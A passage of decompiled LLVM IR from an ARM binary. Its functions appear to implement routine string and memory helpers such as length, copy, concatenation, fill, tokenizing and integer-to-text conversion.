  %v7_a9fc31 = icmp eq i32 %v1_a9f830, 128
  br i1 %v7_a9fc31, label %dec_label_pc_aa04, label %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge

dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge:    ; preds = %dec_label_pc_a9e8, %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge
  %v1_a9f832 = phi i32 [ %v1_a9f8, %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge ], [ %v1_a9f830, %dec_label_pc_a9e8 ]
  %v0_a9f4.pre = load i32, i32* @lr, align 4
  %v2_a9f4 = load i32, i32* @r8, align 4
  %v3_a9f4 = add i32 %v2_a9f4, %v1_a9f832
  %v4_a9f4 = inttoptr i32 %v3_a9f4 to i32*
  store i32 %v0_a9f4.pre, i32* %v4_a9f4, align 4
  %v0_a9f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f8 = add i32 %v0_a9f8, 4
  store i32 %v1_a9f8, i32* %r3.global-to-local, align 4
  %v7_a9fc = icmp eq i32 %v1_a9f8, 128
  br i1 %v7_a9fc, label %dec_label_pc_aa04, label %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge

dec_label_pc_aa04:                                ; preds = %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge, %dec_label_pc_a9e8
  %v0_aa04 = load i32, i32* @r4, align 4
  %v7_aa04 = icmp eq i32 %v0_aa04, -1
  br i1 %v7_aa04, label %dec_label_pc_aa48, label %dec_label_pc_aa0c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_aa04
  %v0_aa0c = load i32, i32* @r5, align 4
  %v1_aa0c = add i32 %v0_aa0c, -156
  %v2_aa0c = inttoptr i32 %v1_aa0c to i32*
  %v3_aa0c = load i32, i32* %v2_aa0c, align 4
  %v1_aa10 = load i32, i32* @r7, align 4
  %v2_aa10 = or i32 %v1_aa10, %v3_aa0c
  store i32 %v2_aa10, i32* %v2_aa0c, align 4
  %v0_aa18 = load i32, i32* @lr, align 4
  %v0_aa20 = load i32, i32* @r4, align 4
  %v1_aa20 = add i32 %v0_aa20, 1
  store i32 %v0_aa18, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-52, align 4
  %v5_aa38 = call i32 @function_ba0c(i32 %v1_aa20, i32 %v2_a9e0, i32 %v0_aa18, i32 %v0_aa18, i32 %v2_a9e4)
  %v2_aa3c = icmp eq i32 %v5_aa38, 0
  br i1 %v2_aa3c, label %dec_label_pc_a9e8.backedge, label %dec_label_pc_aa60

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa04
  %v0_aa48 = call i32 @function_9310()
  %v2_aa50 = call i32 @function_b5a4(i32 %v0_aa48, i32 5)
  %v1_aa58 = call i32 @function_e5cc(i32 10)
  br label %dec_label_pc_a9e8.backedge

dec_label_pc_a9e8.backedge:                       ; preds = %dec_label_pc_aa48, %dec_label_pc_aa0c, %dec_label_pc_aa68
  %v0_a9ec.pre = load i32, i32* %fp.global-to-local, align 4
  %v2_a9f426.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9e8

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa0c
  %v7_aa60 = icmp eq i32 %v5_aa38, -1
  br i1 %v7_aa60, label %dec_label_pc_aaa0, label %dec_label_pc_aa68

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa60
  %v0_aa68 = load i32, i32* @r5, align 4
  %v1_aa68 = add i32 %v0_aa68, -156
  %v2_aa68 = inttoptr i32 %v1_aa68 to i32*
  %v3_aa68 = load i32, i32* %v2_aa68, align 4
  %v1_aa6c = load i32, i32* @r6, align 4
  %v6_aa6c = ashr i32 %v3_aa68, %v1_aa6c
  store i32 %v6_aa6c, i32* %r3.global-to-local, align 4
  %v1_aa70 = urem i32 %v6_aa6c, 2
  %v2_aa70 = icmp eq i32 %v1_aa70, 0
  br i1 %v2_aa70, label %dec_label_pc_a9e8.backedge, label %dec_label_pc_aa78

dec_label_pc_aa78:                                ; preds = %dec_label_pc_aa68
  %v2_aa78 = ptrtoint i32* %stack_var_-68 to i32
  %v2_aa7c = ptrtoint i32* %stack_var_-44 to i32
  %v0_aa80 = load i32, i32* @r4, align 4
  %v4_aa84 = call i32 @function_c0d4(i32 %v0_aa80, i32 %v2_aa78, i32 %v2_aa7c, i32 %v6_aa6c)
  %v1_aa88 = call i32 @function_86e4(i32 %v4_aa84)
  %v1_aa8c = call i32 @function_9890(i32 %v1_aa88)
  %v1_aa90 = call i32 @function_a960(i32 %v1_aa8c)
  %v0_aa94 = load i32, i32* @sl, align 4
  %v1_aa94 = sub i32 0, %v0_aa94
  %v2_aa9c = call i32 @function_b950(i32 %v1_aa94, i32 9)
  br label %dec_label_pc_aaa0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa60, %dec_label_pc_aa78
  %v1_aaa4 = call i32 @function_d7fc(i32 0)
  br label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %thread-pre-split, %dec_label_pc_aaa0
  %v1_aab0 = phi i32 [ %v0_a998, %thread-pre-split ], [ %v1_aaa4, %dec_label_pc_aaa0 ]
  store i32 %v3_a988, i32* @r4, align 4
  store i32 %v6_a988, i32* @r5, align 4
  ret i32 %v1_aab0

; uselistorder directives
  uselistorder i32 %v6_aa6c, { 1, 0, 2 }
  uselistorder i32 %v0_aa18, { 1, 2, 0 }
  uselistorder i32 %v1_a9f8, { 1, 2, 0 }
  uselistorder i32 %v2_a9e0, { 1, 0, 2 }
  uselistorder i32 %v3_a9d4, { 1, 0 }
  uselistorder i32 %v1_a9c4, { 1, 0 }
  uselistorder i32 %v0_a998, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 7, 8, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32)* @function_b950, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_e5cc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_ba0c, { 2, 4, 3, 1, 0 }
  uselistorder i32 ()* @function_93c8, { 2, 1, 0 }
  uselistorder i32* @global_var_1d4dc.202, { 0, 2, 1 }
  uselistorder i32 ()* @function_e030, { 2, 1, 0 }
  uselistorder label %dec_label_pc_aaa8, { 1, 0 }
  uselistorder label %dec_label_pc_aaa0, { 1, 0 }
  uselistorder label %dec_label_pc_a9e8.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9f4.dec_label_pc_a9f4_crit_edge, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_aab8() local_unnamed_addr {
dec_label_pc_aab8:
  %v0_aab8 = load i32, i32* @r0, align 4
  store i32 %v0_aab8, i32* @r2, align 4
  br label %dec_label_pc_aac8

dec_label_pc_aac8:                                ; preds = %dec_label_pc_aac8, %dec_label_pc_aab8
  %storemerge = phi i32 [ 0, %dec_label_pc_aab8 ], [ %v1_aac4, %dec_label_pc_aac8 ]
  %v2_aac8 = add i32 %storemerge, %v0_aab8
  %v3_aac8 = inttoptr i32 %v2_aac8 to i8*
  %v4_aac8 = load i8, i8* %v3_aac8, align 1
  %v6_aac8 = zext i8 %v4_aac8 to i32
  store i32 %v6_aac8, i32* @r3, align 4
  %v2_aacc = icmp eq i8 %v4_aac8, 0
  %v1_aac4 = add i32 %storemerge, 1
  br i1 %v2_aacc, label %dec_label_pc_aad4, label %dec_label_pc_aac8

dec_label_pc_aad4:                                ; preds = %dec_label_pc_aac8
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 0, 2, 1 }
}

define i32 @function_aad8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_aad8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v2_aae42 = load i8, i8* %arg1, align 1
  %v2_aae84 = icmp eq i8 %v2_aae42, 0
  store i1 %v2_aae84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aae84, label %dec_label_pc_aaf0, label %dec_label_pc_aae0

dec_label_pc_aae0:                                ; preds = %dec_label_pc_aad8, %dec_label_pc_aae0
  %v0_aae0 = phi i32 [ %v1_aae0, %dec_label_pc_aae0 ], [ %tmp, %dec_label_pc_aad8 ]
  %v1_aae0 = add i32 %v0_aae0, 1
  store i32 %v1_aae0, i32* %r2.global-to-local, align 4
  %v1_aae4 = inttoptr i32 %v1_aae0 to i8*
  %v2_aae4 = load i8, i8* %v1_aae4, align 1
  %v2_aae8 = icmp eq i8 %v2_aae4, 0
  store i1 %v2_aae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aae8, label %dec_label_pc_aaf0, label %dec_label_pc_aae0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aad8, %dec_label_pc_aae0, %dec_label_pc_aaf0
  %v2_aaf8 = phi i32 [ %v5_aaf8, %dec_label_pc_aaf0 ], [ %tmp, %dec_label_pc_aad8 ], [ %v1_aae0, %dec_label_pc_aae0 ]
  %v0_aaf0 = load i32, i32* @r1, align 4
  %v1_aaf0 = inttoptr i32 %v0_aaf0 to i8*
  %v2_aaf0 = load i8, i8* %v1_aaf0, align 1
  %v5_aaf0 = add i32 %v0_aaf0, 1
  store i32 %v5_aaf0, i32* @r1, align 4
  %v2_aaf4 = icmp eq i8 %v2_aaf0, 0
  store i1 %v2_aaf4, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf8 = inttoptr i32 %v2_aaf8 to i8*
  store i8 %v2_aaf0, i8* %v3_aaf8, align 1
  %v4_aaf8 = load i32, i32* %r2.global-to-local, align 4
  %v5_aaf8 = add i32 %v4_aaf8, 1
  store i32 %v5_aaf8, i32* %r2.global-to-local, align 4
  %v0_aafc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aafc, label %dec_label_pc_ab00, label %dec_label_pc_aaf0

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aaf0
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v5_aaf8, { 1, 0 }
  uselistorder i32 %v1_aae0, { 0, 3, 2, 1 }
  uselistorder i32 %tmp, { 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_aaf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_aae0, { 1, 0 }
}

define i32 @function_ab04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ab04:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_ab181 = load i32, i32* @r2, align 4
  %v1_ab182 = add i32 %v0_ab181, -1
  store i32 %v1_ab182, i32* %r2.global-to-local, align 4
  %v2_ab183 = icmp eq i32 %v0_ab181, 0
  br i1 %v2_ab183, label %dec_label_pc_ab20, label %dec_label_pc_ab0c

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_ab0c, %dec_label_pc_ab04
  %v0_ab0c = phi i32 [ %v1_ab14, %dec_label_pc_ab0c ], [ 0, %dec_label_pc_ab04 ]
  %v2_ab0c = add i32 %v0_ab0c, %arg2
  %v3_ab0c = inttoptr i32 %v2_ab0c to i8*
  %v4_ab0c = load i8, i8* %v3_ab0c, align 1
  %v4_ab10 = add i32 %v0_ab0c, %arg1
  %v5_ab10 = inttoptr i32 %v4_ab10 to i8*
  store i8 %v4_ab0c, i8* %v5_ab10, align 1
  %v0_ab14 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab14 = add i32 %v0_ab14, 1
  store i32 %v1_ab14, i32* %ip.global-to-local, align 4
  %v0_ab18 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab18 = add i32 %v0_ab18, -1
  store i32 %v1_ab18, i32* %r2.global-to-local, align 4
  %v2_ab18 = icmp eq i32 %v0_ab18, 0
  br i1 %v2_ab18, label %dec_label_pc_ab20, label %dec_label_pc_ab0c

dec_label_pc_ab20:                                ; preds = %dec_label_pc_ab0c, %dec_label_pc_ab04
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_ab14, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_ab24(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ab24:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab24 = load i32, i32* @r4, align 4
  store i32 %v3_ab24, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ab34

dec_label_pc_ab34:                                ; preds = %dec_label_pc_ab34, %dec_label_pc_ab24
  %storemerge = phi i32 [ 0, %dec_label_pc_ab24 ], [ %v1_ab3c, %dec_label_pc_ab34 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_ab34 = add i32 %storemerge, %arg1
  %v3_ab34 = inttoptr i32 %v2_ab34 to i8*
  %v4_ab34 = load i8, i8* %v3_ab34, align 1
  %v2_ab38 = icmp eq i8 %v4_ab34, 0
  %v1_ab3c = add i32 %storemerge, 1
  store i32 %v1_ab3c, i32* @r2, align 4
  br i1 %v2_ab38, label %dec_label_pc_ab44, label %dec_label_pc_ab34

dec_label_pc_ab44:                                ; preds = %dec_label_pc_ab34
  %v0_ab44 = load i32, i32* @r0, align 4
  %v3_ab44 = call i32 @function_ab04(i32 %v0_ab44, i32 %arg1, i32 %v1_ab3c)
  %v0_ab48 = load i32, i32* %r4.global-to-local, align 4
  %v2_ab4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ab4c, i32* @r4, align 4
  ret i32 %v0_ab48

; uselistorder directives
  uselistorder i32 %v1_ab3c, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_ab04, { 0, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_ab54(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ab54:
  %r2.global-to-local = alloca i32, align 4
  store i32 0, i32* @r3, align 4
  %v0_ab641 = load i32, i32* @r2, align 4
  %v1_ab642 = add i32 %v0_ab641, -1
  store i32 %v1_ab642, i32* %r2.global-to-local, align 4
  %v2_ab643 = icmp eq i32 %v0_ab641, 0
  br i1 %v2_ab643, label %dec_label_pc_ab6c, label %dec_label_pc_ab5c

dec_label_pc_ab5c:                                ; preds = %dec_label_pc_ab5c, %dec_label_pc_ab54
  %v3_ab5c = phi i32 [ %v1_ab60, %dec_label_pc_ab5c ], [ 0, %dec_label_pc_ab54 ]
  %v5_ab5c = add i32 %v3_ab5c, %arg1
  %v6_ab5c = inttoptr i32 %v5_ab5c to i8*
  store i8 %arg2, i8* %v6_ab5c, align 1
  %v0_ab60 = load i32, i32* @r3, align 4
  %v1_ab60 = add i32 %v0_ab60, 1
  store i32 %v1_ab60, i32* @r3, align 4
  %v0_ab64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab64 = add i32 %v0_ab64, -1
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  %v2_ab64 = icmp eq i32 %v0_ab64, 0
  br i1 %v2_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab5c

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab5c, %dec_label_pc_ab54
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_ab60, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_ab70(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_ab70:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ab70 = icmp eq i8* %arg2, null
  store i1 %v3_ab70, i1* %cpsr_z.global-to-local, align 1
  %v0_ab74 = load i32, i32* @lr, align 4
  store i32 %v0_ab74, i32* %stack_var_-4, align 4
  br i1 %v3_ab70, label %bb, label %dec_label_pc_ab80

bb:                                               ; preds = %dec_label_pc_ab70
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ac1c

dec_label_pc_ab80:                                ; preds = %dec_label_pc_ab70
  %v0_ab80.pr = load i32, i32* %r0.global-to-local, align 4
  %v2_ab80 = icmp eq i32 %v0_ab80.pr, 0
  store i1 %v2_ab80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab80, label %dec_label_pc_ab88, label %dec_label_pc_aba4.preheader

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab80
  store i32 ptrtoint (i8** @global_var_1d4e0.205 to i32), i32* %r3.global-to-local, align 4
  %v2_ab8c = load i8*, i8** @global_var_1d4e0.205, align 4
  %v3_ab8c = ptrtoint i8* %v2_ab8c to i32
  store i32 %v3_ab8c, i32* %r0.global-to-local, align 4
  %v2_ab90 = icmp eq i8* %v2_ab8c, null
  store i1 %v2_ab90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab90, label %dec_label_pc_ac1c, label %dec_label_pc_aba4.preheader

dec_label_pc_aba4.preheader:                      ; preds = %dec_label_pc_ab80, %dec_label_pc_ab88
  %v1_abe0 = phi i32 [ %v0_ab80.pr, %dec_label_pc_ab80 ], [ %v3_ab8c, %dec_label_pc_ab88 ]
  %v3_aba417 = inttoptr i32 %v1_abe0 to i8*
  %v4_aba418 = load i8, i8* %v3_aba417, align 1
  %v6_aba419 = zext i8 %v4_aba418 to i32
  store i32 %v6_aba419, i32* %r3.global-to-local, align 4
  %v2_aba820 = icmp eq i8 %v4_aba418, 0
  store i1 %v2_aba820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aba820, label %dec_label_pc_abb0, label %dec_label_pc_aba0

dec_label_pc_aba0:                                ; preds = %dec_label_pc_aba4.preheader, %dec_label_pc_aba0
  %v0_aba0 = phi i32 [ %v1_aba0, %dec_label_pc_aba0 ], [ 0, %dec_label_pc_aba4.preheader ]
  %v1_aba0 = add i32 %v0_aba0, 1
  %v2_aba4 = add i32 %v1_aba0, %v1_abe0
  %v3_aba4 = inttoptr i32 %v2_aba4 to i8*
  %v4_aba4 = load i8, i8* %v3_aba4, align 1
  %v6_aba4 = zext i8 %v4_aba4 to i32
  store i32 %v6_aba4, i32* %r3.global-to-local, align 4
  %v2_aba8 = icmp eq i8 %v4_aba4, 0
  store i1 %v2_aba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aba8, label %dec_label_pc_abb0, label %dec_label_pc_aba0

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba0, %dec_label_pc_aba4.preheader
  %v1_abcc6 = phi i32 [ 0, %dec_label_pc_aba4.preheader ], [ %v1_aba0, %dec_label_pc_aba0 ]
  %v0_abb0 = phi i32 [ %v6_aba419, %dec_label_pc_aba4.preheader ], [ %v6_aba4, %dec_label_pc_aba0 ]
  %v9_abcc14 = icmp eq i32 %v0_abb0, %v1_abcc6
  store i1 %v9_abcc14, i1* %cpsr_z.global-to-local, align 1
  %v5_abd015 = icmp slt i32 %v0_abb0, %v1_abcc6
  br i1 %v5_abd015, label %dec_label_pc_abb8, label %dec_label_pc_ac10

dec_label_pc_abb8:                                ; preds = %dec_label_pc_abb0, %dec_label_pc_abc8
  %v3_ac00 = phi i32 [ %v1_abc8, %dec_label_pc_abc8 ], [ %v0_abb0, %dec_label_pc_abb0 ]
  %v2_abb8 = add i32 %v3_ac00, %v1_abe0
  %v3_abb8 = inttoptr i32 %v2_abb8 to i8*
  %v4_abb8 = load i8, i8* %v3_abb8, align 1
  %v6_abb8 = zext i8 %v4_abb8 to i32
  store i32 %v6_abb8, i32* %r3.global-to-local, align 4
  %v3_abbc = load i8, i8* %arg2, align 1
  %v4_abbc = zext i8 %v3_abbc to i32
  store i32 %v4_abbc, i32* %r2.global-to-local, align 4
  %v9_abc0 = icmp eq i8 %v3_abbc, %v4_abb8
  store i1 %v9_abc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_abc0, label %dec_label_pc_abd8, label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_abb8
  %v1_abc8 = add nsw i32 %v3_ac00, 1
  %v9_abcc = icmp eq i32 %v1_abc8, %v1_abcc6
  store i1 %v9_abcc, i1* %cpsr_z.global-to-local, align 1
  %v5_abd0 = icmp slt i32 %v1_abc8, %v1_abcc6
  br i1 %v5_abd0, label %dec_label_pc_abb8, label %dec_label_pc_ac10

dec_label_pc_abd8:                                ; preds = %dec_label_pc_abb8
  %v2_abd8 = load i8, i8* %v3_aba417, align 1
  %v3_abd8 = zext i8 %v2_abd8 to i32
  store i32 %v3_abd8, i32* %r3.global-to-local, align 4
  %v9_abdc = icmp eq i8 %v2_abd8, %v4_abb8
  store i1 %v9_abdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_abdc, label %.thread3, label %dec_label_pc_abec

.thread3:                                         ; preds = %dec_label_pc_abd8
  %v2_abe0 = add i32 %v1_abe0, 1
  store i32 %v2_abe0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ac14

dec_label_pc_abec:                                ; preds = %dec_label_pc_abd8
  store i32 %v2_abb8, i32* %r3.global-to-local, align 4
  %v1_abf0 = add i32 %v2_abb8, 1
  %v7_abf0 = icmp eq i32 %v1_abf0, 0
  store i1 %v7_abf0, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1d4e0.205 to i32), i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v7_abf0, label %bb34, label %bb33

bb33:                                             ; preds = %dec_label_pc_abec
  store i32 %v1_abf0, i32* %r3.global-to-local, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_abec, %bb33
  store i8 0, i8* %v3_abb8, align 1
  %v0_ac04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac04, label %.thread5, label %bb35

bb35:                                             ; preds = %bb34
  %v1_ac04 = load i32, i32* %r3.global-to-local, align 4
  %v2_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac04 = inttoptr i32 %v2_ac04 to i32*
  store i32 %v1_ac04, i32* %v3_ac04, align 4
  br label %dec_label_pc_ac1c

.thread5:                                         ; preds = %bb34
  %v1_ac08 = load i32, i32* %r2.global-to-local, align 4
  %v2_ac08 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac08 = inttoptr i32 %v2_ac08 to i32*
  store i32 %v1_ac08, i32* %v3_ac08, align 4
  br label %dec_label_pc_ac1c

dec_label_pc_ac10:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abb0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ac14

dec_label_pc_ac14:                                ; preds = %.thread3, %dec_label_pc_ac10
  %v0_ac18 = phi i32 [ %v2_abe0, %.thread3 ], [ 0, %dec_label_pc_ac10 ]
  store i32 ptrtoint (i8** @global_var_1d4e0.205 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_ac18, i32* bitcast (i8** @global_var_1d4e0.205 to i32*), align 4
  br label %dec_label_pc_ac1c

dec_label_pc_ac1c:                                ; preds = %bb, %bb35, %.thread5, %dec_label_pc_ab88, %dec_label_pc_ac14
  %v2_ac1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_ac1c, i32* @lr, align 4
  %v1_ac20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_ac20

; uselistorder directives
  uselistorder i1 %v9_abdc, { 1, 0 }
  uselistorder i32 %v1_abc8, { 2, 1, 0 }
  uselistorder i32 %v2_abb8, { 1, 0, 2 }
  uselistorder i32 %v3_ac00, { 1, 0 }
  uselistorder i32 %v0_abb0, { 0, 2, 1 }
  uselistorder i32 %v1_abcc6, { 0, 1, 3, 2 }
  uselistorder i32 %v1_abe0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ab80.pr, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 0, 5, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 4, 3, 9, 5, 10, 6, 7, 8 }
  uselistorder i8** @global_var_1d4e0.205, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1d4e0.205 to i32), { 2, 1, 0 }
  uselistorder i8* null, { 1, 2, 3, 4, 0 }
  uselistorder i8* %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac1c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ac14, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_abb8, { 1, 0 }
  uselistorder label %dec_label_pc_aba0, { 1, 0 }
  uselistorder label %dec_label_pc_aba4.preheader, { 1, 0 }
}

define i32 @function_ac28(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ac28:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_ac28 = load i32, i32* @r4, align 4
  %v6_ac28 = load i32, i32* @r5, align 4
  %v9_ac28 = load i32, i32* @r6, align 4
  %v12_ac28 = load i32, i32* @r7, align 4
  %v0_ac2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ac2c, i32* @r7, align 4
  %v2_ac2c = icmp eq i32 %v0_ac2c, 0
  store i1 %v2_ac2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_ac2c, label %dec_label_pc_ace0, label %dec_label_pc_ac3c

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac28
  %v3_ac3c = icmp eq i8 %arg1, 0
  store i1 %v3_ac3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ac3c, label %.thread, label %dec_label_pc_ac50

.thread:                                          ; preds = %dec_label_pc_ac3c
  %v4_ac44 = inttoptr i32 %v0_ac2c to i8*
  store i8 48, i8* %v4_ac44, align 1
  %v0_ac48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac48.pr.pr, label %.thread1, label %dec_label_pc_ac50

.thread1:                                         ; preds = %.thread
  %v4_ac48 = load i32, i32* @r7, align 4
  %v5_ac48 = add i32 %v4_ac48, 1
  %v6_ac48 = inttoptr i32 %v5_ac48 to i8*
  store i8 0, i8* %v6_ac48, align 1
  %v0_ac4c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac4c.pr.pr, label %dec_label_pc_ace0, label %dec_label_pc_ac50

dec_label_pc_ac50:                                ; preds = %dec_label_pc_ac3c, %.thread, %.thread1
  %v7_ac54 = icmp eq i32 %arg2, 10
  store i1 %v7_ac54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ac54, label %.thread3, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_ac50
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %..thread10_crit_edge28

.thread3:                                         ; preds = %dec_label_pc_ac50
  %tmp49 = icmp slt i8 %arg1, 0
  %v2_ac60 = icmp eq i1 %tmp49, false
  store i1 %v2_ac60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ac60, label %..thread10_crit_edge28, label %bb

..thread10_crit_edge28:                           ; preds = %.thread4, %.thread3
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %.thread10

bb:                                               ; preds = %.thread3
  %v3_ac74 = sub nsw i32 0, %tmp
  store i32 %v3_ac74, i32* @r4, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %..thread10_crit_edge28, %bb
  %v0_ac84.pre = phi i32 [ %tmp, %..thread10_crit_edge28 ], [ %v3_ac74, %bb ]
  store i32 32, i32* @r5, align 4
  %v2_ac80 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_ac80, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_ac84

dec_label_pc_ac84:                                ; preds = %bb46, %.thread10
  %v0_ac84 = phi i32 [ %v0_aca8, %bb46 ], [ %v0_ac84.pre, %.thread10 ]
  %v0_ac88 = load i32, i32* @r6, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_ac84, 16777216
  %v1_ac8c = sdiv i32 %sext, 16777216
  %v3_ac8c = call i32 @function_b5a4(i32 %v1_ac8c, i32 %v0_ac88)
  %v7_ac90 = icmp eq i32 %v0_ac88, 9
  store i1 %v7_ac90, i1* %cpsr_z.global-to-local, align 1
  %v1_ac94 = add i32 %v0_ac88, 48
  %v0_ac98 = load i32, i32* @r4, align 4
  store i32 %v0_ac98, i32* @r0, align 4
